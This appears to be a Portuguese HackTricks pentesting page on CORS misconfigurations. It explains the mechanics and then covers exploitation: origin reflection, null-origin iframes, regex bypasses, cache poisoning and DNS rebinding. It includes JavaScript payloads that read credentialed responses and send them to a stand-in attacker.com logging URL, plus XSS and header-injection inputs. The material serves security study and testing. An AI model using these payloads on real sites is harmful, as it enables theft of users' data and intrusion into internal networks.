# CORS - Configura√ß√µes Incorretas e Bypass

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## O que √© CORS?

Cross-Origin Resource Sharing (CORS) padr√£o **permite que servidores definam quem pode acessar seus ativos** e **quais m√©todos de solicita√ß√£o HTTP s√£o permitidos** de fontes externas.

Uma pol√≠tica de **mesma origem** exige que um **servidor solicitante** de um recurso e o servidor que hospeda o **recurso** compartilhem o mesmo protocolo (por exemplo, `http://`), nome de dom√≠nio (por exemplo, `internal-web.com`), e **porta** (por exemplo, 80). Sob essa pol√≠tica, apenas p√°ginas da web do mesmo dom√≠nio e porta t√™m permiss√£o para acessar os recursos.

A aplica√ß√£o da pol√≠tica de mesma origem no contexto de `http://normal-website.com/example/example.html` √© ilustrada da seguinte forma:

| URL acessada                              | Acesso permitido?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Sim: Esquema, dom√≠nio e porta id√™nticos |
| `http://normal-website.com/example2/`     | Sim: Esquema, dom√≠nio e porta id√™nticos |
| `https://normal-website.com/example/`     | N√£o: Esquema e porta diferentes         |
| `http://en.normal-website.com/example/`   | N√£o: Dom√≠nio diferente                  |
| `http://www.normal-website.com/example/`  | N√£o: Dom√≠nio diferente                  |
| `http://normal-website.com:8080/example/` | N√£o: Porta diferente\*                  |

\*O Internet Explorer ignora o n√∫mero da porta na aplica√ß√£o da pol√≠tica de mesma origem, permitindo assim esse acesso.

### Cabe√ßalho `Access-Control-Allow-Origin`

Este cabe√ßalho pode permitir **m√∫ltiplas origens**, um valor **`null`**, ou um caractere curinga **`*`**. No entanto, **nenhum navegador suporta m√∫ltiplas origens**, e o uso do caractere curinga `*` est√° sujeito a **limita√ß√µes**. (O caractere curinga deve ser usado sozinho, e seu uso junto com `Access-Control-Allow-Credentials: true` n√£o √© permitido.)

Este cabe√ßalho √© **emitido por um servidor** em resposta a uma solicita√ß√£o de recurso entre dom√≠nios iniciada por um site, com o navegador adicionando automaticamente um cabe√ßalho `Origin`.

### Cabe√ßalho `Access-Control-Allow-Credentials`

Por **padr√£o**, solicita√ß√µes entre origens s√£o feitas sem credenciais como cookies ou o cabe√ßalho de Autoriza√ß√£o. No entanto, um servidor entre dom√≠nios pode permitir a leitura da resposta quando as credenciais s√£o enviadas configurando o cabe√ßalho `Access-Control-Allow-Credentials` para **`true`**.

Se definido como `true`, o navegador transmitir√° credenciais (cookies, cabe√ßalhos de autoriza√ß√£o ou certificados de cliente TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Solicita√ß√£o de pr√©-voo CSRF

### Compreens√£o das Solicita√ß√µes de Pr√©-voo na Comunica√ß√£o entre Dom√≠nios

Ao iniciar uma solicita√ß√£o entre dom√≠nios sob condi√ß√µes espec√≠ficas, como usar um **m√©todo HTTP n√£o padr√£o** (qualquer coisa al√©m de HEAD, GET, POST), introduzir novos **cabe√ßalhos**, ou empregar um valor de cabe√ßalho **Content-Type especial**, uma solicita√ß√£o de pr√©-voo pode ser necess√°ria. Essa solicita√ß√£o preliminar, aproveitando o m√©todo **`OPTIONS`**, serve para informar o servidor sobre as inten√ß√µes da futura solicita√ß√£o entre origens, incluindo os m√©todos e cabe√ßalhos HTTP que pretende usar.

O protocolo de **Compartilhamento de Recursos de Origem Cruzada (CORS)** exige essa verifica√ß√£o de pr√©-voo para determinar a viabilidade da opera√ß√£o entre origens solicitada, verificando os m√©todos e cabe√ßalhos permitidos, e a confiabilidade da origem. Para entender em detalhes quais condi√ß√µes contornam a necessidade de uma solicita√ß√£o de pr√©-voo, consulte o guia abrangente fornecido pela [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

√â crucial observar que a **aus√™ncia de uma solicita√ß√£o de pr√©-voo n√£o anula a necessidade de a resposta conter cabe√ßalhos de autoriza√ß√£o**. Sem esses cabe√ßalhos, o navegador fica incapacitado em sua capacidade de processar a resposta da solicita√ß√£o entre origens.

Considere a seguinte ilustra√ß√£o de uma solicita√ß√£o de pr√©-voo destinada a empregar o m√©todo `PUT` juntamente com um cabe√ßalho personalizado chamado `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Em resposta, o servidor pode retornar cabe√ßalhos indicando os m√©todos aceitos, a origem permitida e outros detalhes da pol√≠tica CORS, conforme mostrado abaixo:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Este cabe√ßalho especifica quais cabe√ßalhos podem ser usados durante a solicita√ß√£o real. √â definido pelo servidor para indicar os cabe√ßalhos permitidos em solicita√ß√µes do cliente.
* **`Access-Control-Expose-Headers`**: Atrav√©s deste cabe√ßalho, o servidor informa ao cliente sobre quais cabe√ßalhos podem ser expostos como parte da resposta, al√©m dos cabe√ßalhos de resposta simples.
* **`Access-Control-Max-Age`**: Este cabe√ßalho indica por quanto tempo os resultados de uma solicita√ß√£o pr√©-voo podem ser armazenados em cache. O servidor define o tempo m√°ximo, em segundos, que as informa√ß√µes retornadas por uma solicita√ß√£o pr√©-voo podem ser reutilizadas.
* **`Access-Control-Request-Headers`**: Usado em solicita√ß√µes pr√©-voo, este cabe√ßalho √© definido pelo cliente para informar ao servidor quais cabe√ßalhos HTTP o cliente deseja usar na solicita√ß√£o real.
* **`Access-Control-Request-Method`**: Este cabe√ßalho, tamb√©m usado em solicita√ß√µes pr√©-voo, √© definido pelo cliente para indicar qual m√©todo HTTP ser√° usado na solicita√ß√£o real.
* **`Origin`**: Este cabe√ßalho √© definido automaticamente pelo navegador e indica a origem da solicita√ß√£o entre origens. √â usado pelo servidor para avaliar se a solicita√ß√£o recebida deve ser permitida ou negada com base na pol√≠tica CORS.

Observe que geralmente (dependendo do tipo de conte√∫do e cabe√ßalhos definidos) em uma solicita√ß√£o **GET/POST nenhum pedido pr√©-voo √© enviado** (a solicita√ß√£o √© enviada **diretamente**), mas se voc√™ deseja acessar os **cabe√ßalhos/corpo da resposta**, ela deve conter um cabe√ßalho _Access-Control-Allow-Origin_ permitindo isso.\
**Portanto, CORS n√£o protege contra CSRF (mas pode ser √∫til).**

### **Solicita√ß√£o pr√©-voo de rede local**

1. **`Access-Control-Request-Local-Network`**: Este cabe√ßalho √© inclu√≠do na solicita√ß√£o do cliente para indicar que a consulta √© direcionada a um recurso de rede local. Ele serve como um marcador para informar ao servidor que a solicita√ß√£o se origina de dentro da rede local.
2. **`Access-Control-Allow-Local-Network`**: Em resposta, os servidores utilizam este cabe√ßalho para comunicar que o recurso solicitado tem permiss√£o para ser compartilhado com entidades fora da rede local. Ele atua como um sinal verde para compartilhar recursos em diferentes limites de rede, garantindo acesso controlado enquanto mant√©m protocolos de seguran√ßa.

Uma **resposta v√°lida permitindo a solicita√ß√£o de rede local** tamb√©m precisa ter na resposta o cabe√ßalho `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Note que o IP linux **0.0.0.0** funciona para **burlar** esses requisitos para acessar o localhost, pois esse endere√ßo IP n√£o √© considerado "local".

Tamb√©m √© poss√≠vel **burlar os requisitos da Rede Local** se voc√™ usar o **endere√ßo IP p√∫blico de um ponto de extremidade local** (como o IP p√∫blico do roteador). Pois em v√°rias ocasi√µes, mesmo se o **IP p√∫blico** estiver sendo acessado, se for **da rede local**, o acesso ser√° concedido.
{% endhint %}

## Configura√ß√µes incorretas explor√°veis

Foi observado que a defini√ß√£o de `Access-Control-Allow-Credentials` como **`true`** √© um requisito para a maioria dos **ataques reais**. Essa configura√ß√£o permite que o navegador envie credenciais e leia a resposta, aumentando a efic√°cia do ataque. Sem isso, o benef√≠cio de fazer com que um navegador emita uma solicita√ß√£o em vez de faz√™-lo por conta pr√≥pria diminui, pois torna-se invi√°vel aproveitar os cookies de um usu√°rio.

### Exce√ß√£o: Explorando a Localiza√ß√£o da Rede como Autentica√ß√£o

Existe uma exce√ß√£o onde a localiza√ß√£o da rede da v√≠tima atua como uma forma de autentica√ß√£o. Isso permite que o navegador da v√≠tima seja usado como um proxy, contornando a autentica√ß√£o baseada em IP para acessar aplicativos de intranet. Este m√©todo compartilha semelhan√ßas de impacto com o DNS rebinding, mas √© mais simples de explorar.

### Reflex√£o de `Origin` em `Access-Control-Allow-Origin`

O cen√°rio do mundo real onde o valor do cabe√ßalho `Origin` √© refletido em `Access-Control-Allow-Origin` √© teoricamente improv√°vel devido √†s restri√ß√µes de combina√ß√£o desses cabe√ßalhos. No entanto, desenvolvedores que buscam habilitar o CORS para v√°rios URLs podem gerar dinamicamente o cabe√ßalho `Access-Control-Allow-Origin` copiando o valor do cabe√ßalho `Origin`. Essa abordagem pode introduzir vulnerabilidades, especialmente quando um atacante utiliza um dom√≠nio com um nome projetado para parecer leg√≠timo, enganando assim a l√≥gica de valida√ß√£o.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Explorando a Origem `null`

A origem `null`, especificada para situa√ß√µes como redirecionamentos ou arquivos HTML locais, possui uma posi√ß√£o √∫nica. Algumas aplica√ß√µes colocam essa origem em uma lista branca para facilitar o desenvolvimento local, permitindo inadvertidamente que qualquer site imite uma origem `null` por meio de um iframe isolado, assim contornando as restri√ß√µes do CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### T√©cnicas de Bypass de Express√£o Regular

Ao encontrar uma lista branca de dom√≠nios, √© crucial testar oportunidades de bypass, como anexar o dom√≠nio do atacante a um dom√≠nio da lista branca ou explorar vulnerabilidades de subdom√≠nio. Al√©m disso, as express√µes regulares usadas para valida√ß√£o de dom√≠nio podem ignorar nuances nas conven√ß√µes de nomenclatura de dom√≠nio, apresentando mais oportunidades de bypass.

### Bypasses Avan√ßados de Express√£o Regular

Padr√µes de regex geralmente se concentram em caracteres alfanum√©ricos, ponto (.), e h√≠fen (-), negligenciando outras possibilidades. Por exemplo, um nome de dom√≠nio criado para incluir caracteres interpretados de forma diferente por navegadores e padr√µes de regex pode contornar verifica√ß√µes de seguran√ßa. O tratamento de caracteres de subdom√≠nio de sublinhado por Safari, Chrome e Firefox ilustra como tais discrep√¢ncias podem ser exploradas para contornar a l√≥gica de valida√ß√£o de dom√≠nio.

**Para mais informa√ß√µes e configura√ß√µes deste check de bypass:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **e** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (281).png>)

### A partir de XSS dentro de um subdom√≠nio

Os desenvolvedores frequentemente implementam mecanismos defensivos para proteger contra a explora√ß√£o de CORS, listando os dom√≠nios que t√™m permiss√£o para solicitar informa√ß√µes. Apesar dessas precau√ß√µes, a seguran√ßa do sistema n√£o √© infal√≠vel. A presen√ßa de at√© mesmo um √∫nico subdom√≠nio vulner√°vel dentro dos dom√≠nios da lista branca pode abrir a porta para a explora√ß√£o de CORS por meio de outras vulnerabilidades, como XSS (Cross-Site Scripting).

Para ilustrar, considere o cen√°rio em que um dom√≠nio, `requester.com`, est√° na lista branca para acessar recursos de outro dom√≠nio, `provider.com`. A configura√ß√£o do lado do servidor pode se parecer com isso:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Nesta configura√ß√£o, todos os subdom√≠nios de `requester.com` t√™m permiss√£o de acesso. No entanto, se um subdom√≠nio, como `sub.requester.com`, for comprometido com uma vulnerabilidade de XSS, um atacante pode aproveitar essa fraqueza. Por exemplo, um atacante com acesso a `sub.requester.com` poderia explorar a vulnerabilidade de XSS para contornar as pol√≠ticas de CORS e acessar maliciosamente recursos em `provider.com`.

### **Envenenamento de cache do lado do servidor**

[**A partir desta pesquisa**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

√â poss√≠vel que, ao explorar o envenenamento de cache do lado do servidor por meio da inje√ß√£o de cabe√ßalho HTTP, uma vulnerabilidade armazenada de Cross-Site Scripting (XSS) possa ser induzida. Este cen√°rio se desenrola quando uma aplica√ß√£o falha em sanitizar o cabe√ßalho `Origin` para caracteres ilegais, criando uma vulnerabilidade especialmente para usu√°rios do Internet Explorer e Edge. Esses navegadores tratam (0x0d) como um terminador de cabe√ßalho HTTP leg√≠timo, levando a vulnerabilidades de inje√ß√£o de cabe√ßalho HTTP.

Considere a seguinte solicita√ß√£o onde o cabe√ßalho `Origin` √© manipulado:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer e Edge interpretam a resposta como:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Embora explorar diretamente essa vulnerabilidade fazendo com que um navegador da web envie um cabe√ßalho malformado n√£o seja vi√°vel, uma solicita√ß√£o elaborada pode ser gerada manualmente usando ferramentas como o Burp Suite. Este m√©todo poderia levar a um cache do lado do servidor salvando a resposta e inadvertidamente servindo-a para outros. A carga elaborada tem como objetivo alterar o conjunto de caracteres da p√°gina para UTF-7, uma codifica√ß√£o de caracteres frequentemente associada a vulnerabilidades XSS devido √† sua capacidade de codificar caracteres de forma que possam ser executados como script em certos contextos.

Para mais informa√ß√µes sobre vulnerabilidades XSS armazenadas, consulte [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Nota**: A explora√ß√£o de vulnerabilidades de inje√ß√£o de cabe√ßalho HTTP, especialmente por meio de envenenamento de cache do lado do servidor, destaca a import√¢ncia cr√≠tica de validar e sanitizar toda entrada fornecida pelo usu√°rio, incluindo cabe√ßalhos HTTP. Sempre empregue um modelo de seguran√ßa robusto que inclua valida√ß√£o de entrada para prevenir tais vulnerabilidades.

### **Envenenamento de cache do lado do cliente**

[**A partir desta pesquisa**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Neste cen√°rio, uma inst√¢ncia de uma p√°gina da web refletindo o conte√∫do de um cabe√ßalho HTTP personalizado sem codifica√ß√£o adequada √© observada. Especificamente, a p√°gina da web reflete de volta o conte√∫do inclu√≠do em um cabe√ßalho `X-User-id`, que poderia incluir JavaScript malicioso, conforme demonstrado pelo exemplo em que o cabe√ßalho cont√©m uma tag de imagem SVG projetada para executar c√≥digo JavaScript ao carregar.

As pol√≠ticas de Compartilhamento de Recursos de Origem Cruzada (CORS) permitem o envio de cabe√ßalhos personalizados. No entanto, sem a resposta sendo renderizada diretamente pelo navegador devido a restri√ß√µes do CORS, a utilidade de tal inje√ß√£o pode parecer limitada. O ponto cr√≠tico surge ao considerar o comportamento de cache do navegador. Se o cabe√ßalho `Vary: Origin` n√£o for especificado, torna-se poss√≠vel que a resposta maliciosa seja armazenada em cache pelo navegador. Posteriormente, essa resposta em cache poderia ser renderizada diretamente ao navegar para a URL, contornando a necessidade de renderiza√ß√£o direta na solicita√ß√£o inicial. Esse mecanismo aprimora a confiabilidade do ataque ao aproveitar o cache do lado do cliente.

Para ilustrar esse ataque, √© fornecido um exemplo de JavaScript, projetado para ser executado no ambiente de uma p√°gina da web, como atrav√©s de um JSFiddle. Este script realiza uma a√ß√£o simples: ele envia uma solicita√ß√£o para uma URL especificada com um cabe√ßalho personalizado contendo o JavaScript malicioso. Ap√≥s a conclus√£o bem-sucedida da solicita√ß√£o, ele tenta navegar at√© a URL de destino, potencialmente acionando a execu√ß√£o do script injetado se a resposta tiver sido armazenada em cache sem o tratamento adequado do cabe√ßalho `Vary: Origin`.

Aqui est√° uma quebra resumida do JavaScript usado para executar este ataque:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, tamb√©m conhecido como Inclus√£o de Script de Sites Cruzados, √© um tipo de vulnerabilidade que se aproveita do fato de que a Pol√≠tica de Mesma Origem (SOP) n√£o se aplica ao incluir recursos usando a tag de script. Isso ocorre porque os scripts precisam poder ser inclu√≠dos de diferentes dom√≠nios. Essa vulnerabilidade permite que um atacante acesse e leia qualquer conte√∫do que tenha sido inclu√≠do usando a tag de script.

Essa vulnerabilidade se torna particularmente significativa quando se trata de JavaScript din√¢mico ou JSONP (JSON com Padding), especialmente quando informa√ß√µes de autoridade ambiente como cookies s√£o usadas para autentica√ß√£o. Ao solicitar um recurso de um host diferente, os cookies s√£o inclu√≠dos, tornando-os acess√≠veis ao atacante.

Para entender melhor e mitigar essa vulnerabilidade, voc√™ pode usar o plugin BurpSuite dispon√≠vel em [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Esse plugin pode ajudar a identificar e resolver potenciais vulnerabilidades de XSSI em suas aplica√ß√µes web.

[**Leia mais sobre os diferentes tipos de XSSI e como explor√°-los aqui.**](xssi-cross-site-script-inclusion.md)

Tente adicionar um **par√¢metro de callback** na solicita√ß√£o. Talvez a p√°gina tenha sido preparada para enviar os dados como JSONP. Nesse caso, a p√°gina enviar√° os dados de volta com `Content-Type: application/javascript`, o que ir√° contornar a pol√≠tica de CORS.

![](<../.gitbook/assets/image (853).png>)

### Bypass F√°cil (in√∫til?)

Uma maneira de contornar a restri√ß√£o de `Access-Control-Allow-Origin` √© solicitando que uma aplica√ß√£o web fa√ßa uma solicita√ß√£o em seu nome e envie de volta a resposta. No entanto, nesse cen√°rio, as credenciais da v√≠tima final n√£o ser√£o enviadas, pois a solicita√ß√£o √© feita para um dom√≠nio diferente.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Esta ferramenta fornece um proxy que encaminha sua solicita√ß√£o juntamente com seus cabe√ßalhos, enquanto tamb√©m falsifica o cabe√ßalho de Origem para corresponder ao dom√≠nio solicitado. Isso contorna efetivamente a pol√≠tica de CORS. Aqui est√° um exemplo de uso com XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Esta ferramenta oferece uma abordagem alternativa para encaminhar solicita√ß√µes. Em vez de passar sua solicita√ß√£o como est√°, o servidor faz sua pr√≥pria solicita√ß√£o com os par√¢metros especificados.

### Bypass Iframe + Popup

Voc√™ pode **contornar as verifica√ß√µes de CORS** como `e.origin === window.origin` **criando um iframe** e **a partir dele abrindo uma nova janela**. Mais informa√ß√µes na seguinte p√°gina:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Rebinding de DNS via TTL

O rebinding de DNS via TTL √© uma t√©cnica usada para contornar certas medidas de seguran√ßa manipulando registros DNS. Veja como funciona:

1. O atacante cria uma p√°gina da web e faz a v√≠tima acess√°-la.
2. O atacante ent√£o altera o DNS (IP) de seu pr√≥prio dom√≠nio para apontar para a p√°gina da web da v√≠tima.
3. O navegador da v√≠tima armazena em cache a resposta do DNS, que pode ter um valor de TTL (Tempo de Vida) indicando por quanto tempo o registro DNS deve ser considerado v√°lido.
4. Quando o TTL expira, o navegador da v√≠tima faz uma nova solicita√ß√£o DNS, permitindo que o atacante execute c√≥digo JavaScript na p√°gina da v√≠tima.
5. Mantendo o controle sobre o IP da v√≠tima, o atacante pode coletar informa√ß√µes da v√≠tima sem enviar cookies para o servidor da v√≠tima.

√â importante observar que os navegadores possuem mecanismos de cache que podem impedir o abuso imediato dessa t√©cnica, mesmo com valores de TTL baixos.

O rebinding de DNS pode ser √∫til para contornar verifica√ß√µes expl√≠citas de IP realizadas pela v√≠tima ou para cen√°rios em que um usu√°rio ou bot permanece na mesma p√°gina por um per√≠odo prolongado, permitindo que o cache expire.

Se voc√™ precisa de uma maneira r√°pida de abusar do rebinding de DNS, voc√™ pode usar servi√ßos como [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Para executar seu pr√≥prio servidor de rebinding de DNS, voc√™ pode utilizar ferramentas como **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Isso envolve expor a porta local 53/udp, criar um registro A apontando para ele (por exemplo, ns.example.com) e criar um registro NS apontando para o subdom√≠nio A criado anteriormente (por exemplo, ns.example.com). Qualquer subdom√≠nio do subdom√≠nio ns.example.com ser√° ent√£o resolvido pelo seu host.

Voc√™ tamb√©m pode explorar um servidor em execu√ß√£o publicamente em [http://rebind.it/singularity.html](http://rebind.it/singularity.html) para uma melhor compreens√£o e experimenta√ß√£o.

### Rebinding de DNS via **Cache**

Outra maneira de contornar a defesa de cache √© utilizando v√°rios endere√ßos IP para o mesmo subdom√≠nio no provedor de DNS. Veja como funciona:

1. O atacante configura dois registros A (ou um √∫nico registro A com dois IPs) para o mesmo subdom√≠nio no provedor de DNS.
2. Quando um navegador verifica esses registros, ele recebe ambos os endere√ßos IP.
3. Se o navegador decidir usar primeiro o endere√ßo IP do atacante, o atacante pode servir um payload que realiza solicita√ß√µes HTTP para o mesmo dom√≠nio.
4. No entanto, uma vez que o atacante obt√©m o endere√ßo IP da v√≠tima, ele deixa de responder ao navegador da v√≠tima.
5. O navegador da v√≠tima, ao perceber que o dom√≠nio n√£o est√° respondendo, passa a usar o segundo endere√ßo IP fornecido.
6. Ao acessar o segundo endere√ßo IP, o navegador contorna a Pol√≠tica de Mesma Origem (SOP), permitindo que o atacante abuse disso e colete e exfiltre informa√ß√µes.

Essa t√©cnica aproveita o comportamento dos navegadores quando s√£o fornecidos v√°rios endere√ßos IP para um dom√≠nio. Ao controlar estrategicamente as respostas e manipular a escolha do endere√ßo IP pelo navegador, um atacante pode explorar o SOP e acessar informa√ß√µes da v√≠tima.

{% hint style="warning" %}
Observe que, para acessar o localhost, voc√™ deve tentar restringir **127.0.0.1** no Windows e **0.0.0.0** no Linux.\
Provedores como godaddy ou cloudflare n√£o me permitiram usar o IP 0.0.0.0, mas a AWS route53 me permitiu criar um registro A com 2 IPs, sendo um deles "0.0.0.0"

<img src="../.gitbook/assets/image (137).png" alt="" data-size="original">
{% endhint %}

Para mais informa√ß√µes, voc√™ pode verificar [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)
### Outros Desvios Comuns

* Se **os IPs internos n√£o forem permitidos**, eles podem **ter esquecido de proibir 0.0.0.0** (funciona em Linux e Mac)
* Se **os IPs internos n√£o forem permitidos**, responda com um **CNAME** para **localhost** (funciona em Linux e Mac)
* Se **os IPs internos n√£o forem permitidos** como respostas DNS, voc√™ pode responder com **CNAMEs para servi√ßos internos** como www.corporate.internal.

### Arma de Rebinding de DNS

Voc√™ pode encontrar mais informa√ß√µes sobre as t√©cnicas de desvio anteriores e como usar a seguinte ferramenta na palestra [Gerald Doussot - Estado dos Ataques de Rebinding de DNS e Singularidade de Origem - Confer√™ncia DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularidade de Origem`**](https://github.com/nccgroup/singularity) √© uma ferramenta para realizar ataques de [rebinding de DNS](https://en.wikipedia.org/wiki/DNS\_rebinding). Inclui os componentes necess√°rios para reverter o endere√ßo IP do nome DNS do servidor de ataque para o endere√ßo IP da m√°quina alvo e para servir payloads de ataque para explorar software vulner√°vel na m√°quina alvo.

### Prote√ß√£o Real contra Rebinding de DNS

* Use TLS em servi√ßos internos
* Solicite autentica√ß√£o para acessar dados
* Valide o cabe√ßalho Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Proposta para sempre enviar uma solicita√ß√£o de pr√©-voo quando servidores p√∫blicos desejam acessar servidores internos

## **Ferramentas**

**Fuzz poss√≠veis configura√ß√µes incorretas em pol√≠ticas CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Refer√™ncias

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
